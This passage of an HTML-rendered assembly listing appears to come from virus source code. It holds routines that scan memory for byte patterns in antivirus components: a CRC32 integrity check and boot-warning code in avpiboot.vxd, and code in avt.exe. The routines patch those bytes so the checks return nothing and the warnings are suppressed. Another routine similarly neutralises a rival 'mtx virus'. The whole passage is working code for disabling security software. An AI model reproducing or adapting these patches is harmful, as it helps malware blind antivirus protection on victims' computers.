                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc1">; AVPI -- crc32</span><span class="sc0">

</span><span class="sc1">;[C1 E8 08              shr     eax, 8</span><span class="sc0">
</span><span class="sc1">; 8B]14 95 xx xx xx xx  mov     edx, crc32tab[edx*4]</span><span class="sc0">
</span><span class="sc1">; 33 C2                 xor     eax, edx             ; --&gt; 33 c0  xor eax,eax</span><span class="sc0">

</span><span class="sc1">;[C1 E9 08              shr     ecx, 8</span><span class="sc0">
</span><span class="sc1">; 8B]04 85 xx xx xx xx  mov     eax, crc32tab[eax*4]</span><span class="sc0">
</span><span class="sc1">; 33 C1                 xor     eax, ecx             ; --&gt; 33 c0  xor eax,eax</span><span class="sc0">

</span><span class="sc5">__patch10</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">10</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">9514C233h</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__e1</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8504C133h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
</span><span class="sc5">__e1</span><span class="sc4">:</span><span class="sc0">                   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">11</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0C0h</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">; AVPI -- boot warning</span><span class="sc0">

</span><span class="sc1">; avpiboot.vxd (16-bit)</span><span class="sc0">
</span><span class="sc1">; 0E                    push    cs</span><span class="sc0">
</span><span class="sc1">;[1F                    pop     ds</span><span class="sc0">
</span><span class="sc1">; BE]xx xx              mov     si, offset aErrorReadingBootShit</span><span class="sc0">
</span><span class="sc1">; E8 xx xx              call    doDialogBox   ; --&gt; B8   mov eax, ...</span><span class="sc0">
</span><span class="sc1">; F9                    stc</span><span class="sc0">
</span><span class="sc1">; EB xx                 jmp     xxxxxxxx</span><span class="sc0">

</span><span class="sc5">__patch11</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBF9E80Eh</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0B8h</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">; avpiboot.vxd (16-bit)</span><span class="sc0">
</span><span class="sc1">; 33 C0                 xor     ax, ax</span><span class="sc0">
</span><span class="sc1">; CD 16                 int     16h     ; --&gt; B0 6E  mov al, 'n'</span><span class="sc0">

</span><span class="sc5">__patch12</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">6EB0h</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">; avt.exe (32-bit)</span><span class="sc0">
</span><span class="sc1">; </span><span class="sc0">

</span><span class="sc5">__patch13</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0E8006AFFh</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0FFFFF0AEh</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">090C3C033h</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">; mtx virus</span><span class="sc0">
</span><span class="sc1">; (it's the time to stop :P)</span><span class="sc0">

</span><span class="sc5">__patch14</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0BE004018h</span><span class="sc0">
                        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">090C3C033h</span><span class="sc0">
                        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__continue</span><span class="sc0">

</span><span class="sc1">;----------------------------------------------------------------------------</span><span class="sc0">
</span></div></body>
</html>
